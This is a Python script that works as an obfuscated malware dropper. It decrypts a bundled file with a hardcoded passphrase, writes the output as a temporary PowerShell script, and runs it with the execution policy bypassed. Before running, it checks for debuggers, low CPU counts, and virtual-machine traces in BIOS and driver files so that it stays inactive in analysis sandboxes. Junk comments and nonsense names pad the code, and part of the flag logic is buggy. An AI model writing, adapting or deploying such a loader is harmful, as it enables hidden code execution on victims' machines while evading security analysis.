import hashlib
import hmac
import subprocess
import tempfile
import os
import time
import sys
gotthatdocterpepp = False
#hbyughgkudhgljhljhfdljlihdfjlhfdjhfdjhhfdhrdhgoudy77by7fdd87
wrong_result = None
#hfjldhgfudoyfudg7yfbyfdgo8fdhgyfd8ug8odguf8d0hg8ufdhu8fhufd8h
if sys.gettrace():
    gotthatdocterpepp = True
#gfuhgy7fdyg7fyg7fsgyfdgshfbuyhgvbhfs grs7i8ghrs87ghr7gs7hgh7rsg7rshgs7 g
#hgjrugrsygs7gfv87rshgdhfi7fgtfgbhfd7bfdihufygufdyb7fy7gry7sh7tyfsygf7s yg7dsys7ygys7gys
ENCRYPTED_FILE = "lemonpresident.enc"
PASSPHRASE = "lemon president"
OUTPUT_EXTENSION = ".ps1"

if os.cpu_count() <= 2:
    gotthatdocterpepp = True

NONCE_BYTES = 12
HMAC_BYTES = 32
CHUNK_SIZE = 4096
flag = 0
def hkdf(passphrase, salt, info=b"", length=64):
    prk = hmac.new(salt, passphrase.encode(), hashlib.sha256).digest()
    okm = b""
    t = b""
    counter = 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        okm += t
        counter += 1
    return okm[:length]


def keystream_generator(enc_key, nonce):
    state = hashlib.sha256(enc_key + nonce).digest()
    while True:
        for b in state:
            yield b
        state = hashlib.sha256(state).digest()


def pumpum():
    try:
        potato = subprocess.check_output(
            "wmic computersystem get manufacturer",
            shell=True
        ).decode().lower()

        beans = ["vmware", "virtualbox", "qemu", "kvm", "xen"]

        return any(x in potato for x in beans)
    except:
        return False


def run_powershell_script(path):
    subprocess.run([
        "powershell",
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", path
    ], check=True)
    if pumpum():
        flag ^= 3

def bingus():
    try:
        potato = subprocess.check_output(
            "wmic bios get serialnumber",
            shell=True
        ).decode().lower()

        return "vmware" in potato or "virtual" in potato
    except:
        return False


def nugget():
    fries = [
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys"
    ]

    return any(os.path.exists(x) for x in fries)


if nugget():
    flag ^= 7
#bugiob78d 7d8 gdy8h d7h8d 78hrd97h8rodu rd98g797d 7grd89g7rtd87oh7rd8oh78oh7rdh7r8h7ro8dh78rdh7r8h7rh78dfh7fd78h7fdhyfduhfdhuret7yh44
def decrypt_and_open():
    
    with open(ENCRYPTED_FILE, "rb") as f:
        nonce = f.read(NONCE_BYTES)
        data = f.read()
#bgduobjdbhfoudhbvuoxbhfduobfdyoubfudbf7byfd7ybfd7 ydg7fdvyfd7vdyv7 yf7 byfd7 ydv7y fgfdgdhfdjngdhjfdh5eh5rehtehjteh
    if gotthatdocterpepp:
        return wrong_result
#hgudhdfh 87dhgr87gyds8hfudhntufhjfdj,fhdjhgdfkhgfhgfhdshjghdsghdsljghsljghsjghsgursghursbhubhures7grys8g78es87ges09 n88f7e8sgursuigdhsgkh
    ciphertext = data[:-HMAC_BYTES]
    tag = data[-HMAC_BYTES:]
#nbug8nb8ugfb7d8fh7f8dhf87dhf8d78dh98fdh8fdh8d9h8f9dh8d9h89fdhdiuh89fd8hf9dh8fh989rd y7hyrdgrhdghrhghsdrjhrsdjtdtd
    key_material = hkdf(PASSPHRASE, nonce, info=b"file-encryption", length=64)
    enc_key = key_material[:32]
    mac_key = key_material[32:]
#464y54jhhfdhtdyrdjtrgshuifgojguhgshugdsjhgsrgsjhgrshrgsjhhsibdsihngdihbijgugdshrgsnjrgrgsjhrgsjhrgsjhrgsjhrgjhrgjgjrgjgjgjhgjhgjhgjgjgjgj
    mac = hmac.new(mac_key, nonce, hashlib.sha256)
    mac.update(ciphertext)
#nfgbyubc78gbc7ufbhufbhuguh3out4jnthbjnrgghdurt3qyuy54uhg4wt3huhtnjbhugbduhgd8uorgrgohrgo8ytwt3whurguhrgo8u8ufbuhfdfghugsuhgsuhgs8ugesrgs
    if not hmac.compare_digest(mac.digest(), tag):
        raise RuntimeError("Authentication failed")
#oiudyreuiguyhoggkh4wi7tyeti7hvbrh73qhgh3ygb3givg32h72h2828hghtguhgjhsghsjghjrhgjrhjlhjhuhuoooooohohoddppspshgpphphspphjhskjhrhg
    stream = keystream_generator(enc_key, nonce)
#bhoufghyo8tdh7d8ot7hr8d9hythtfdhntuirdh57 y4ttrnshbnthnsuhturshtgu5ea84yyhrhbbahkburtshugrhtdsuhglraqqqhiughitrwhitoooho
    fd, temp_path = tempfile.mkstemp(suffix=OUTPUT_EXTENSION)
    os.close(fd)
#huihgiugyughkghghkghkgfkhdsfgkhgfkhdghdhydugyrugryuwyuy5u4wyugefgyb4wgfg4uwwutg4wggwgwhg4h4hhh444445556fd
    with open(temp_path, "wb") as out:
        for i in range(0, len(ciphertext), CHUNK_SIZE):
            chunk = ciphertext[i:i + CHUNK_SIZE]
            out.write(bytes(b ^ next(stream) for b in chunk))
#ghufhgufkhbkuythgi7ruhrg84hgo8h58ehoh8orehgreo8ghrwgow8ghwgngiuewr hbriuwhghffhwuhfiuewhgwg
    try:
        run_powershell_script(temp_path)
    finally:
        os.remove(temp_path)
#ghjghfdukghfdgkufdhgmdfgbdruygrdbguyrdbgrkudgbutbd g75t y47tyhdbghkgbfgkhfgb
if bingus():
    flag ^= 5
#gfsgkhfsghfghfjghfdghjfksghrsgfhfbgyfdvhfsgbfsg fsbghsbgrsbkhtbstbtrshrshhrhsh
# beanyg = "91205042d746f67faf4f303bc6c0fd4efc87bde37a6969b5a6c4e3a5abdfffff"
#fhdsjgfkfhgfdskughfshgfxgbkfdghfghfsgh,jfxhgfgfbkghfdsaujfdsrsgfdhdhfdhshfdsjh
# def dimdom(func, exbeanyg):
#     code = func.__code__.co_code
#     h = hashlib.sha256(code).hexdigest()
#     return h == beanyg
#fgehgfhgfkhfshkghksdhgksghfkghfdkfbhdifdhkfdkhbfkhbgkhgfbgfskbgskbgkfsgshgshk
#grijghfjvhduhfukfdhkudhgfdkuhgfghghfulshgshgshglshglfsghlsghsd
if flag != 0:
    gotthatdocterpepp = True
#gfjghkjfhdfljhfdljfhdgfdjgfdljgjdlgfjshgsljgfdhdlhuitdgjirdghjhglkfd
# if not dimdom(decrypt_and_open, beanyg):
#     gotthatdocterpepp = True
#ghfdukgytydugfhdjgljdljeghljdgjidlgrhsljhglijelkjgshgjhgsjhgljshgljsgrshyro87gy
if __name__ == "__main__":
    decrypt_and_open()
#ghfugyte87gt987h97t987hfd98hd98hgd98htd8htdjkhrjlhtejhrejnhrejhtejlkhrejhoiteijhteo